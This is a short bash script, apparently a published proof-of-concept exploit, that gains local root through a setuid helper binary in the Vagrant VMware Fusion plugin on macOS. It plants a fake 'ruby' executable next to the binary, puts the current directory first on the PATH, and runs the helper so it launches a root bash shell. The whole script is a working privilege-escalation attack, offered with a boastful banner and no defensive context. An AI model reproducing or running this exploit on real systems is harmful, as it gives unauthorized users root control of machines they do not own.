#!/bin/bash
vuln_bin=`find ~/.vagrant.d/ -name vagrant_vmware_desktop_sudo_helper_wrapper_darwin_amd64 -perm +4000 |tail -n1`
if [ "$vuln_bin" == "" ] ; then
  echo "Vulnerable binary not found."
  exit 1
fi
dir=`dirname "$vuln_bin"`
cd "$dir"
cat > ruby <<EOF
#!/bin/bash
echo
echo "************************************************************************"
echo "* Depressingly trivial local root privesc in the vagrant vmware_fusion *"
echo "* plugin, by m4rkw                                                     *"
echo "************************************************************************"
echo
echo "Shout out to #coolkids o/"
echo
bash
exit 0
EOF
chmod 755 ruby
VAGRANT_INSTALLER_EMBEDDED_DIR="~/.vagrant.d/" PATH=".:$PATH" ./vagrant_vmware_desktop_sudo_helper_wrapper_darwin_amd64